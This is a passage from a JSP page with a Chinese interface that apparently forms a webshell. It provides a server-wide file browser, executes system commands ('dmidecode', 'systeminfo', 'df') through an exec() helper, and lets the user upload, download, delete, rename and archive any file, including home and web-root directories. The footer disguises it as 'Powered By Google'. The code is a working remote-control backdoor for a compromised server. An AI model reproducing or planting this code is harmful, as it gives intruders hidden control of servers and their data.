        }
      }
    }
    out.print("</table>");
  }else if("info".equals(mt4))
  {
    out.print("<pre>");
    String str = exec(isLinux ? "dmidecode" : "systeminfo", null);
    out.print(str);
    out.print("</pre>");
  }else
  {

p=p.replaceAll("\\\\","/");
if(!p.endsWith("/"))p+="/";

%>
<input type="text" name="p" value="<%=p%>" onFocus="select();" style="position:absolute; width:400px; top:1px;">
<select id="pmenu" style="position:absolute; width:400px; top:1px; clip:rect(0 400 20 381)" onChange="form1.p.value=value;form1.submit();">
<%

File fs[]=!isLinux&&p.length()<2?File.listRoots():f.listFiles();
//排序
if(oby>1)
{
  for(int i=0;i<fs.length;i++)
  {
    long ilm=fs[i].lastModified();
    long ile=fs[i].length();
    for(int j=i;j<fs.length;j++)
    {
      long jlm=fs[j].lastModified();
      long jle=fs[j].length();
      if(oby==4&&ilm>jlm||oby==2&&ile>jle)
      {
        File sw=fs[i];
        fs[i]=fs[j];
        fs[j]=sw;
        ilm=jlm;
        ile=jle;
      }
    }
  }
}
out.print("<option value=\"/\">我的电脑");
File rfs[]=File.listRoots();
if(isLinux)
{
  Matcher m=Pattern.compile(" (/[^\n]+)\n").matcher(exec("df",null));
  ArrayList al=new ArrayList();
  while(m.find())
  {
    al.add(new File(m.group(1)));
  }
  rfs=new File[al.size()];
  al.toArray(rfs);
}
for(int i=0;i<rfs.length;i++)
{
  String path=rfs[i].getPath().replaceAll("\\\\","/");
  String name=!fsv.isFloppyDrive(rfs[i])&&rfs[i].exists()?fsv.getSystemDisplayName(rfs[i]):path;
  out.print("<option value=\""+path+"\">&nbsp;&nbsp;&nbsp;&nbsp;"+name);
  if(p.length()>0&&p.startsWith(path))
  {
    int pindex=path.length();
    while((pindex=p.indexOf("/",pindex+1))!=-1)
    {
      String str=p.substring(0,pindex+1);
      String rps[]=str.split("/");
      out.print("<option value=\""+str+"\">");
      for(int j=0;j<rps.length;j++)out.print("&nbsp;&nbsp;");
      out.print(rps[rps.length-1]);
    }
  }
}

String sps[]={"user.home","java.home","user.dir","real.path"};//sun.boot.library.path,"catalina.home"
for(int i=0;i<sps.length;i++)
{
  String value;
  switch(i)
  {
    case 3:
    value=application.getRealPath("/");
    break;
    default:
    value=System.getProperty(sps[i]);
  }
  out.print("<option value=\""+value+"\">　"+sps[i]+"</option>");
}
%>
</select>
<span style="width:400px">　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　</span>
<script type="">document.getElementById("pmenu").value=document.form1.p.value;</script>
<input type="submit" value="转到" onClick="form1.mt.disabled=form1.v.disabled=true;form1.method='get';"/><input type="button" id="cut" value="剪切" onClick="d('file.cut');"/><input type="button" id="copy" value="复制" onClick="d('file.copy');"/><input type="button" <%if(session.getAttribute("file.cut")==null&&session.getAttribute("file.copy")==null)out.print(" disabled ");%> value="粘贴" onClick="d('file.paste');"/><input type="button" id="del" value="删除" onClick="d('file.del');"/><input type="button" id="ren" value="改名" onClick="d('file.ren');"/><input type="button" id="unzip" value="解压" onClick="d('file.unzip')"/><input type="button" id="zip" value="压缩" onClick="d('file.zip')"/><input type="button" id="down" value="下载" onClick="d('file.down')"/><span><input type="file" name='upload' style="position:absolute;width:72px;filter:alpha(opacity=0)" onChange="d('file.upload');"><input type="button" id="upload" value="上传文件"></span><input type="button" id="mkdir" value="创建" onClick="d('file.mkdir')"/>
<table cellspacing="1">
<tr>
  <th width="1"><input type="checkbox" onClick="s(checked)"/></th>
  <th><a href="javascript:o(1)">名称</a></th>
  <th align="right"><a href="javascript:o(2)">大小</a></th>
  <th>类型</th>
  <th><a href="javascript:o(4)">日期</a></th>
  <th>属性</th>
</tr>
<%
if (fs == null)
{
  out.print("<tr><td>目录不存在...</td></tr>");
}else
{
  StringBuffer sb=new StringBuffer();
  java.text.SimpleDateFormat sdf=new java.text.SimpleDateFormat("yyyy-MM-dd HH:mm");
  java.text.DecimalFormat df=new java.text.DecimalFormat("#,###.##");
  for (int i = pos*100;i<pos*100+100&& i < fs.length; i++)
  {
    String pc=fs[i].getPath().replaceAll("\\\\","/");
    String pu=URLEncoder.encode(pc,"UTF-8");
    if(pu.equals("A%3A%2F"))continue;
    String name,desc="--",time="",pro="";
    if(!fs[i].exists())
    {
      name=pc;
    }else
    {
      ShellFolder sf=ShellFolder.getShellFolder(fs[i]);
      name=sf.getDisplayName();
      desc=sf.getFolderType();
      time=sdf.format(new java.util.Date(fs[i].lastModified()));
      if (p.length()>2&&fs[i].isHidden())pro+=" H";
      if (!fs[i].canWrite())pro+=" R";
    }
    if(name.endsWith(".lnk"))
    {
      fs[i]=getLnkpath(fs[i]);
    }
    if(fs[i].isDirectory())
    {
      out.print("<tr onmouseover=\"bgColor='#EAF1F9';\" onmouseout=\"bgColor='';\" >");
      out.print("<td><input type=\"checkbox\" name=\"ps\" value=\""+pc+"\"/></td>");
      out.print("<td class='t1'><a href=\"?p="+pu+"\">");
      if(ver)out.print("<img src='?mt=file.ext&p="+pu+"' class='I"+pro+"' />");
      out.print(name+"</a></td>");
      out.print("<td class='t2'>");
      if(p.length()<2)
      {
        //out.print(df.format(fs[i].getTotalSpace()/1024F/1024F/1024F)+" GB");
      }else if(ver)
      {
        String son[]=fs[i].list();
        out.print(son==null?-1:son.length);
      }
      out.print("<td>"+desc);
      out.print("<td class='t4'>"+time);
      out.print("<td>");
      if(p.length()<2)
      {
        //out.print(df.format(fs[i].getUsableSpace()/1024F/1024F/1024F)+" GB");
      }else
      {
        out.print(pro);
      }
      out.print("</td></tr>");
    }else
    {
      sb.append("<tr onmouseover=bgColor='#EAF1F9'; onmouseout=bgColor='';>");
      sb.append("<td><input type='checkbox' name='ps' value=\"").append(pc).append("\"/></td>");
      sb.append("<td class='t1'><a href=\"?mt=file.dl&p=").append(pu).append("\">");
      if(ver)sb.append("<img src='?mt=file.ext&p=").append(pu).append("' class='I").append(pro).append("' />");
      sb.append(name).append("</a></td>");
      sb.append("<td class='t2'>").append(df.format(fs[i].length()/1024F)).append(" KB</td>");
      sb.append("<td>").append(desc);
      sb.append("<td class='t4'>").append(time).append("</td>");
      sb.append("<td>").append(pro).append("</td></tr>");
    }
  }
  out.print(sb.toString());
  if(fs.length>100)
  {
    String pu=URLEncoder.encode(p,"UTF-8");
    out.print("<tr><td colspan='2'>共"+fs.length+"对象<td colspan='4' align='right'>");
    if(pos>0)
    {
      out.print("<a href='?p="+pu+"'><font face='webdings'>9</font></a> <a href='?p="+pu+"&pos="+(pos-1)+"'><font face='webdings'>3</font></a> ");
    }
    int len=fs.length/100;
    if(fs.length%100!=0)len++;
    for(int i=0;i<len;i++)
    {
      if(i!=pos)
      {
        out.print("<a href='?p="+pu+"&pos="+i+"'>");
      }
      out.print(i+"</a> ");
    }
    if(pos<len-1)
    {
      out.print("<a href='?p="+pu+"&pos="+(pos+1)+"'><font face='webdings'>4</font></a> <a href='?p="+pu+"&pos="+(len-1)+"'><font face='webdings'>:</font></a>");
    }
  }
}
%>
</table>
<%
  }
}
%>
</form>

<table align="center" style="width:500px">
<tr>
<td align="right">Copyright &copy;2008</td>
<td>Powered By <a href="http://www.g.cn/" target="_blank">Google</a>
</td>
</tr>
</table>

</body>
</html>
